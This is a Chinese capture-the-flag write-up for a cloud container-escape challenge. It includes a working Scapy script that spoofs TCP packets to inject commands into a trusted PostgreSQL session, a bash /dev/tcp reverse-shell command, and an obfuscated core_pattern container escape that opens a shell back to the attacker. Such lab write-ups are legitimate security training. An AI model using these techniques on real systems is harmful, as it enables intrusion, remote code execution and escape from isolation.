# WIZCTF · Contain Me If You Can WP

> 原文: https://www.ctfiot.com/270252.html
> ID: 270252

点击蓝字

关注我们

声明

本文作者：neko本文字数：4482字

阅读时长：约12分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

❝

WIZ 7月云安全挑战 ·Contain Me If You Can

你发现自己身处容器化环境中。 要获取该 flag，你必须横向移动并退出容器。你能做到吗？ 该 flag 位于主机文件系统的 /flag 目录下。 祝你好运！挑战地址：https://www.cloudsecuritychampionship.com/challenge/2

添加BOT发送 云安全 可加入交流群～

wiz也是出新挑战了，我们来看一下这个怎么做

首先告诉我们，我们处于一个容器中，我们需要横向并逃逸，才可以获取/flag

信息收集

既然要进行横向那先看一下printenv和netstat以及ps，做初步的信息收集

通过netstat -ano看到这么个东西

发现172.19.0.2有一台5432的postgresql服务，那题目里大概的意思就是让我们去横向到pg数据库，然后逃逸出去

抓包发现172.19.0.3到172.19.0.2的通信流量，定期发送一条查询语句select now();进行查询

目前得到信息如下

本机：172.19.0.3

postgreSQL数据库：172.19.0.2

端口：5432

tcpdump抓包发现明文通信

定期会去发送查询语句select now();

猜想和验证

通过抓包发现说明查询是生效的，这里我们判断这台机器是预认证

所以我们的初步想法有两个， 第一个是通过抓取密码然后使用psql去连接数据库，第二个办法就是通过直接利用信任关系发包，让服务器直接处理我们的查询语句。

第一个办法，我们尝试抓取密码， 先发送一个断连的包，他会尝试重连，然后我们尝试抓包从中获取密码

❝

这条本来是正常解题思路，但是因为当时作者抓包时间不够，导致没有抓到密码，以为这个地方没有密码，所以尝试第二个办法

信任关系的利用

因为pg服务对我们的这个机器是信任关系，那我们理论上来说，丢过去的流量，只要符合他的发包规则，那我们也能得到pg服务器的响应

随后我们写一个脚本，这里感谢flower的友情协助优化后的脚本

fromscapy.allimport*importstructimportsysiface ="eth0"pg_port =5432counter =0# 监听 PostgreSQL 返回的 DataRow 包，提取里面的字段内容defparse_all_pgsql_data_rows(data): i =0 results = [] length = len(data) whilei < length: ifdata[i:i+1] ==b'D': # DataRow包标识 ifi +5> length: break row_len = struct.unpack('!I', data[i+1:i+5])[0] start = i +5 end = start + row_len -4 ifend > length: break row_data = data[start:end] iflen(row_data) <2: break field_count = struct.unpack('!H', row_data[:2])[0] pos =2 fields = [] for_inrange(field_count): ifpos +4> len(row_data): break field_len = struct.unpack('!I', row_data[pos:pos+4])[0] pos +=4 iffield_len ==0xFFFFFFFF: fields.append(None) else: field_val = row_data[pos:pos+field_len].decode('utf-8', errors='replace') fields.append(field_val) pos += field_len results.append(fields) i = end else: i +=1 returnresultsdefmake_query_payload(sql): sql_bytes = sql.encode() +b'x00' length = len(sql_bytes) +4 returnb'Q'+ length.to_bytes(4, byteorder='big') + sql_bytesdefon_packet(pkt): globalcounter, queries, max_packets ifIPinpktandTCPinpkt: tcp = pkt[TCP] ip = pkt[IP] iftcp.sport == pg_port: # 打印捕获到的 DataRow 内容 ifRawinpkt: data = pkt[Raw].load rows = parse_all_pgsql_data_rows(data) ifrows: forfieldsinrows: print("[PostgreSQL Data Row Fields]:") forfinfields: print(" "+ (fiffelse'NULL')) print("-"*50) ifcounter >= max_packets: print("All queries sent. Stopping sniff.") raiseKeyboardInterrupt src_ip = ip.dst dst_ip = ip.src src_port = tcp.dport dst_port = tcp.sport seq_num = tcp.ack ack_num = tcp.seq + len(tcp.payload) sql = queries[counter] print(f"[Captured]{ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport}") print(f"[Construct] Sending query with seq={seq_num}ack={ack_num}:{sql}") payload = make_query_payload(sql) pkt_to_send = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num) / Raw(load=payload) send(pkt_to_send, iface=iface, verbose=False) print("[Sent] SQL query sent.n") counter +=1defmain(): globalqueries, max_packets iflen(sys.argv) <2: print(f"Usage: python3{sys.argv[0]}<command_to_run>") print(f"Example: python3{sys.argv[0]}'whoami'") sys.exit(1) # 从argv获取命令参数 cmd = sys.argv[1] queries = [ "CREATE TEMP TABLE tmp_output(line text);", f"COPY tmp_output FROM PROGRAM '{cmd}';", "SELECT * FROM tmp_output;" ] max_packets = len(queries) print(f"Listening on PostgreSQL server port{pg_port}, sending queries on packet capture.") print(f"Command to run on server:{cmd}") try: sniff(iface=iface, filter=f"tcp and src port{pg_port}", prn=on_packet, store=0) exceptKeyboardInterrupt: print("Program terminated.")if__name__ =="__main__":main()

通过这个脚本，我们可以实现伪造tcp包，处理并发送我们的查询语句

# 伪造TCP包的关键参数计算 src_ip = ip.dst # 伪装成客户端IP dst_ip = ip.src # 目标为服务器IP src_port = tcp.dport # 客户端端口 dst_port = tcp.sport # 服务器端口(5432) seq_num = tcp.ack # 使用服务器期望的序列号 ack_num = tcp.seq + len(tcp.payload) # 计算正确的确认号

尤其是这一段，我们根据抓包的东西来看

我们需要发送伪造的数据包的话，需要符合服务器预期，所以我们这里通过脚本来使用服务器预期的序列号，避免失败

然后我们安装一个screen，用作多窗口处理任务

先验证一下脚本是否可以行得通

发现是可以的，此时我们也就不需要认证了，因为他信任我这台机器

然后我们使用这个脚本来把pg的shell弹出来

vim 1.pychmod +x 1.pyapt update && apt install screen -y

然后新建一个窗口监听shell

nc -lvnp 8989

然后去运行脚本执行反弹shell用以获取postgreSQL服务的shell

python3 1.py ‘bash -c "bash -i >& /dev/tcp/172.19.0.3/8989 0>&1"’

然后我们在根目录下发现一个脚本

这个脚本里使用了sudo来执行命令做备份

然后我们去查看sudoers，看看允许哪些用户做提权

发现是wheel组都可以，那我们直接提权就好了sudo su

这里我们发现

其实这个时候就说明我们拥有root权限，然后我们再去逃逸，这里使用core_pattern的那个逃逸就好了

先监听端口8899

然后把弹shell的命令base64一下，写入core_pattern，然后再手动触发崩溃就可以了

echo '|/bin/bash -c echo${IFS%%??}c2ggLWkgPiYvZGV2L3RjcC8xNzIuMTkuMC4zLzg4OTkgMD4mMQ==|base64${IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern

然后手动触发崩溃

sh -c 'kill -11 "$$"'

这里我们碰到一个问题，哪怕我们是以sudo来执行的命令，但是依旧没有权限，此时我们尝试sudo su切换至root，随后用root权限重新来执行一遍

我们回到另一个窗口查看是否接收到宿主shell

发现了flag

作者

Neko

每一个地方都有可学习的知识

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
fromscapy.allimport*importstructimportsysiface ="eth0"pg_port =5432counter =0# 监听 PostgreSQL 返回的 DataRow 包，提取里面的字段内容defparse_all_pgsql_data_rows(data): i =0 results = [] length = len(data) whilei < length: ifdata[i:i+1] ==b'D': # DataRow包标识 ifi +5> length: break row_len = struct.unpack('!I', data[i+1:i+5])[0] start = i +5 end = start + row_len -4 ifend > length: break row_data = data[start:end] iflen(row_data) <2: break field_count = struct.unpack('!H', row_data[:2])[0] pos =2 fields = [] for_inrange(field_count): ifpos +4> len(row_data): break field_len = struct.unpack('!I', row_data[pos:pos+4])[0] pos +=4 iffield_len ==0xFFFFFFFF: fields.append(None) else: field_val = row_data[pos:pos+field_len].decode('utf-8', errors='replace') fields.append(field_val) pos += field_len results.append(fields) i = end else: i +=1 returnresultsdefmake_query_payload(sql): sql_bytes = sql.encode() +b'x00' length = len(sql_bytes) +4 returnb'Q'+ length.to_bytes(4, byteorder='big') + sql_bytesdefon_packet(pkt): globalcounter, queries, max_packets ifIPinpktandTCPinpkt: tcp = pkt[TCP] ip = pkt[IP] iftcp.sport == pg_port: # 打印捕获到的 DataRow 内容 ifRawinpkt: data = pkt[Raw].load rows = parse_all_pgsql_data_rows(data) ifrows: forfieldsinrows: print("[PostgreSQL Data Row Fields]:") forfinfields: print(" "+ (fiffelse'NULL')) print("-"*50) ifcounter >= max_packets: print("All queries sent. Stopping sniff.") raiseKeyboardInterrupt src_ip = ip.dst dst_ip = ip.src src_port = tcp.dport dst_port = tcp.sport seq_num = tcp.ack ack_num = tcp.seq + len(tcp.payload) sql = queries[counter] print(f"[Captured]{ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport}") print(f"[Construct] Sending query with seq={seq_num}ack={ack_num}:{sql}") payload = make_query_payload(sql) pkt_to_send = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num) / Raw(load=payload) send(pkt_to_send, iface=iface, verbose=False) print("[Sent] SQL query sent.n") counter +=1defmain(): globalqueries, max_packets iflen(sys.argv) <2: print(f"Usage: python3{sys.argv[0]}<command_to_run>") print(f"Example: python3{sys.argv[0]}'whoami'") sys.exit(1) # 从argv获取命令参数 cmd = sys.argv[1] queries = [ "CREATE TEMP TABLE tmp_output(line text);", f"COPY tmp_output FROM PROGRAM '{cmd}';", "SELECT * FROM tmp_output;" ] max_packets = len(queries) print(f"Listening on PostgreSQL server port{pg_port}, sending queries on packet capture.") print(f"Command to run on server:{cmd}") try: sniff(iface=iface, filter=f"tcp and src port{pg_port}", prn=on_packet, store=0) exceptKeyboardInterrupt: print("Program terminated.")if__name__ =="__main__":main()
```



```
# 伪造TCP包的关键参数计算 src_ip = ip.dst # 伪装成客户端IP dst_ip = ip.src # 目标为服务器IP src_port = tcp.dport # 客户端端口 dst_port = tcp.sport # 服务器端口(5432) seq_num = tcp.ack # 使用服务器期望的序列号 ack_num = tcp.seq + len(tcp.payload) # 计算正确的确认号
```



```
vim 1.pychmod +x 1.pyapt update && apt install screen -y
```



```
nc -lvnp 8989
```



```
python3 1.py ‘bash -c "bash -i >& /dev/tcp/172.19.0.3/8989 0>&1"’
```



```
echo '|/bin/bash -c echo${IFS%%??}c2ggLWkgPiYvZGV2L3RjcC8xNzIuMTkuMC4zLzg4OTkgMD4mMQ==|base64${IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern
```



```
sh -c 'kill -11 "$$"'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638345-wxsync-2025-09-c1791da0e1cf4ba822cbb9abb096f2ce.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638346-wxsync-2025-09-2f51c95e7f9c72a1aa448b3e956af10b.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638348-wxsync-2025-09-6be8db8f6ff36de7ccf4eebc4023dd71.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638350-wxsync-2025-09-20b3aa0959ad200b275c43f844dfe341.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638352-wxsync-2025-09-68a636b5fd17c29ca82243aabd0a5b58.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638353-wxsync-2025-09-417d3bd4a70663ecfc20521c2b429e63.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638355-wxsync-2025-09-9a0a8f6ddc8f437e664ff330eb3bd33d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638357-wxsync-2025-09-dc85627e2a388181a20be1bb661c398d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638359-wxsync-2025-09-8ebdc63082c6da6168f3fab340b2ea06.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757638360-wxsync-2025-09-b4524461ecdcc685b8df9514add1891a.png)